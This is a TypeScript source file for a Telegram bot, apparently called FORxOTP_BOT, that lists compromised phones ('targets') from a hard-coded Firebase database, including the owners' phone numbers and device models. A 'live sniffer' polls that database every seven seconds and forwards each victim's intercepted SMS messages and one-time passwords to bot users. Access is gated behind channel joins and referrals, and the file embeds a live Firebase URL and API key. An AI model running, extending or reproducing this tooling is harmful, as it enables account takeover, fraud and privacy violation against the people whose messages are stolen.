import express from 'express';
import pkg from 'grammy';
const { Bot, InlineKeyboard, Context, session, SessionFlavor } = pkg;
import axios from 'axios';
import { createServer as createViteServer } from 'vite';
import path from 'path';
import * as dotenv from 'dotenv';

dotenv.config();

// --- CONFIGURATION ---
const BOT_TOKEN = process.env.BOT_TOKEN || "";
const DEVICE_URL = "https://hdmax1-58366-default-rtdb.firebaseio.com/user_data.json?key=AIzaSyCoW3TxZQs3IedrYRMj3a9zDz6Iq2-U7vs";
const SMS_URL = "https://hdmax1-58366-default-rtdb.firebaseio.com/user_sms.json?key=AIzaSyCoW3TxZQs3IedrYRMj3a9zDz6Iq2-U7vs";

const REQUIRED_CHANNEL = "@xFREE_OTP_PANEL";
const BOT_USERNAME = "FORxOTP_BOT";
const PAGE_SIZE = 80;

// --- TYPES ---
interface SessionData {
  registered?: boolean;
  unlocked?: boolean;
  activeMonitor?: {
    deviceId: string;
    lastTimestamp: number;
    intervalId: NodeJS.Timeout | null;
  };
}
type MyContext = Context & SessionFlavor<SessionData>;

// --- BOT INITIALIZATION ---
const bot = new Bot<MyContext>(BOT_TOKEN);

// Mock storage (In-memory for demo, but persistent in logic)
const referralCounts: Record<number, number> = {};
const globalRegisteredUsers = new Set<number>();
const globalUnlockedUsers = new Set<number>();

bot.use(session({
  initial: (): SessionData => ({})
}));

// --- GLOBAL ERROR HANDLER ---
bot.catch((err) => {
  const ctx = err.ctx;
  console.error(`Error while handling update ${ctx.update.update_id}:`);
  const e = err.error;
  if (e instanceof Error) {
    console.error(e.message);
  } else {
    console.error(e);
  }
});

// --- UTILS ---
function escapeHtml(text: string): string {
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

async function safeAnswer(ctx: MyContext, options?: { text?: string; show_alert?: boolean }) {
  try {
    await ctx.answerCallbackQuery(options);
  } catch (e) {
    console.error("Failed to answer callback query:", (e as Error).message);
  }
}
async function checkSub(userId: number): Promise<boolean> {
  try {
    const member = await bot.api.getChatMember(REQUIRED_CHANNEL, userId);
    return ['member', 'administrator', 'creator'].includes(member.status);
  } catch (e) {
    return false;
  }
}

async function getFirebaseData(url: string) {
  try {
    const response = await axios.get(url, { timeout: 10000 });
    return response.data;
  } catch (e) {
    console.error(`Firebase Error: ${e}`);
    return null;
  }
}

function formatSms(msg: any, devId: string, isLive = false) {
  const header = isLive ? "⚡ <b>NEW LIVE SMS DETECTED!</b> ⚡" : "🎯 <b>CURRENT LATEST SMS</b> 🎯";
  const sender = escapeHtml(msg.sender || 'Unknown');
  const sim = escapeHtml(msg.sim_number || 'Unknown');
  const date = escapeHtml(msg.date || 'Unknown');
  const body = escapeHtml(msg.body || 'No Content');
  const safeDevId = escapeHtml(devId);

  return (
    `${header}\n` +
    `━━━━━━━━━━━━━━━━━━━━\n` +
    `👤 <b>From:</b> <code>${sender}</code>\n` +
    `📟 <b>SIM:</b> <code>${sim}</code>\n` +
    `🕒 <b>Time:</b> <code>${date}</code>\n` +
    `━━━━━━━━━━━━━━━━━━━━\n` +
    `💬 <b>Message:</b>\n<code>${body}</code>\n` +
    `━━━━━━━━━━━━━━━━━━━━\n` +
    `📱 Target ID: <code>${safeDevId}</code>`
  );
}

// --- PAGINATION ENGINE ---
async function getDevicePageData(page: number) {
  const devices = await getFirebaseData(DEVICE_URL);
  const smsDump = await getFirebaseData(SMS_URL);

  if (!devices || !smsDump) {
    return { markup: null, text: "❌ Firebase Connectivity Issue! Retrying later." };
  }

  const onlineDevices: [string, any][] = [];
  for (const [devId, info] of Object.entries(devices)) {
    if (info && typeof info === 'object' && (info as any).status === 'online' && smsDump[devId]) {
      onlineDevices.push([devId, info]);
    }
  }

  const totalDevices = onlineDevices.length;
  if (totalDevices === 0) {
    return { markup: null, text: "😴 No targets online right now." };
  }

  const totalPages = Math.ceil(totalDevices / PAGE_SIZE);
  let currentPage = Math.max(0, Math.min(page, totalPages - 1));

  const startIdx = currentPage * PAGE_SIZE;
  const currentDevicesSlice = onlineDevices.slice(startIdx, startIdx + PAGE_SIZE);

  const keyboard = new InlineKeyboard();

  currentDevicesSlice.forEach(([devId, info], i) => {
    const seqNum = startIdx + i + 1;
    const phone = info.phoneNumber || 'Unknown';
    const model = info.d_name || 'Unknown';
    keyboard.text(`${seqNum}. ✅ ${model} | ${phone}`, `track_${devId}`).row();
  });

  const navRow = [];
  if (currentPage > 0) {
    navRow.push(InlineKeyboard.text("⬅️ Back", `page_${currentPage - 1}`));
  }
  if (currentPage < totalPages - 1) {
    navRow.push(InlineKeyboard.text("Next ➡️", `page_${currentPage + 1}`));
  }
  if (navRow.length > 0) {
    keyboard.row(...navRow);
  }

  const msgText = `🔥 <b>${totalDevices} Targets Online!</b>\nSelect a device to lock-on and sniff live OTPs. 😈\n\n📄 Page ${currentPage + 1} of ${totalPages}`;

  return { markup: keyboard, text: msgText };
}

// --- COMMANDS ---
bot.command("start", async (ctx) => {
  const userId = ctx.from!.id;
  const arg = ctx.match;

  // 1. Referral Logic
  if (!globalRegisteredUsers.has(userId)) {
    globalRegisteredUsers.add(userId);
    if (arg) {
      const referrerId = parseInt(arg);
      if (!isNaN(referrerId) && referrerId !== userId) {
        referralCounts[referrerId] = (referralCounts[referrerId] || 0) + 1;
        if (referralCounts[referrerId] >= 1 && !globalUnlockedUsers.has(referrerId)) {
          globalUnlockedUsers.add(referrerId);
          try {
            await bot.api.sendMessage(referrerId, "🎉 <b>Congratulations!</b> Someone joined using your link. Your bot is now <b>UNLOCKED</b>!\n\nSend /start to use it.", { parse_mode: "HTML" });
          } catch (e) {}
        }
      }
    }
  }

  // 2. Channel Check
  const isSubbed = await checkSub(userId);
  if (!isSubbed) {
    const kb = new InlineKeyboard()
      .url("📢 Join Channel", `https://t.me/${REQUIRED_CHANNEL.replace('@', '')}`)
      .row()
      .text("✅ Check Joined", "check_join");
    return ctx.reply("⚠️ <b>Access Denied!</b>\nYou must join our channel to use this bot.", { reply_markup: kb, parse_mode: "HTML" });
  }

  // 3. Invite Check
  if (!globalUnlockedUsers.has(userId)) {
    const refLink = `https://t.me/${BOT_USERNAME}?start=${userId}`;
    return ctx.reply(
      `🔒 <b>Bot is Locked!</b>\n\n` +
      `To unlock the full features, you must refer at least <b>1 friend</b>.\n\n` +
      `🔗 <b>Your Referral Link:</b>\n<code>${refLink}</code>\n\n` +
      `📊 <b>Current Referrals:</b> ${referralCounts[userId] || 0}/1`,
      { parse_mode: "HTML" }
    );
  }

  // 4. Main Flow
  if (ctx.session.activeMonitor?.intervalId) {
    clearInterval(ctx.session.activeMonitor.intervalId);
    ctx.session.activeMonitor.intervalId = null;
  }

  const { markup, text } = await getDevicePageData(0);
  await ctx.reply(text, { reply_markup: markup || undefined, parse_mode: "HTML" });
});

bot.callbackQuery("check_join", async (ctx) => {
  const isSubbed = await checkSub(ctx.from!.id);
  if (!isSubbed) {
    return safeAnswer(ctx, { text: "❌ You haven't joined the channel yet!", show_alert: true });
  }
  await safeAnswer(ctx, { text: "✅ Channel verified!", show_alert: true });
  try {
    await ctx.deleteMessage();
  } catch (e) {}
  await ctx.reply("✅ Verified! Please send /start again to continue.");
});

bot.callbackQuery(/^page_(\d+)$/, async (ctx) => {
  // Answer immediately to avoid timeout
  await safeAnswer(ctx);
  
  const page = parseInt(ctx.match[1]);
  const { markup, text } = await getDevicePageData(page);
  try {
    await ctx.editMessageText(text, { reply_markup: markup || undefined, parse_mode: "HTML" });
  } catch (e) {
    const msg = (e as Error).message;
    if (msg.includes("message is not modified")) return; // Ignore this specific error
    console.error("Failed to edit pagination message:", msg);
  }
});

bot.callbackQuery(/^track_(.+)$/, async (ctx) => {
  const devId = ctx.match[1];
  const userId = ctx.from!.id;

  // Answer first to avoid timeout
  await safeAnswer(ctx);

  if (ctx.session.activeMonitor?.intervalId) {
    clearInterval(ctx.session.activeMonitor.intervalId);
    ctx.session.activeMonitor.intervalId = null;
  }

  const smsDump = await getFirebaseData(SMS_URL);
  let currentMaxTs = 0;

  if (smsDump && smsDump[devId]) {
    const allMsgs = smsDump[devId];
    const validMsgs = Object.values(allMsgs).filter((v: any) => typeof v === 'object');
    if (validMsgs.length > 0) {
      const latestMsg: any = validMsgs.reduce((prev: any, current: any) => (prev.timestamp > current.timestamp) ? prev : current);
      currentMaxTs = latestMsg.timestamp || 0;
      await ctx.reply(formatSms(latestMsg, devId), { parse_mode: "HTML" });
    } else {
      await ctx.reply(`📭 No purana SMS found for <code>${devId}</code>, starting live sniffer...`, { parse_mode: "HTML" });
    }
  }

  await ctx.reply(`📡 <b>Live Sniffer Activated</b> for <code>${devId}</code>\nAb naye messages apne aap aayenge... Stay tuned! 🔥`, { parse_mode: "HTML" });

  // LIVE SNIFFER LOOP (Optimized)
  const intervalId = setInterval(async () => {
    try {
      const dump = await getFirebaseData(SMS_URL);
      if (dump && dump[devId]) {
        const msgs = Object.values(dump[devId]).filter((v: any) => typeof v === 'object' && v.timestamp > currentMaxTs);
        if (msgs.length > 0) {
          const latest: any = msgs.reduce((prev: any, current: any) => (prev.timestamp > current.timestamp) ? prev : current);
          currentMaxTs = latest.timestamp;
          await bot.api.sendMessage(userId, formatSms(latest, devId, true), { parse_mode: "HTML" });
        }
      }
    } catch (e) {
      console.error("Sniffer Error", e);
    }
  }, 7000);

  ctx.session.activeMonitor = {
    deviceId: devId,
    lastTimestamp: currentMaxTs,
    intervalId: intervalId
  };
});

// --- SERVER SETUP ---
async function startServer() {
  const app = express();
  const PORT = 3000;

  app.get("/api/health", (req, res) => {
    res.json({ 
        status: "ok", 
        bot: "running",
        users: globalRegisteredUsers.size,
        referrals: Object.keys(referralCounts).length
    });
  });

  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
    if (BOT_TOKEN) {
      bot.start();
      console.log("🚀 Telegram Bot Started!");
    } else {
      console.warn("⚠️ BOT_TOKEN not found. Bot not started.");
    }
  });
}

startServer();
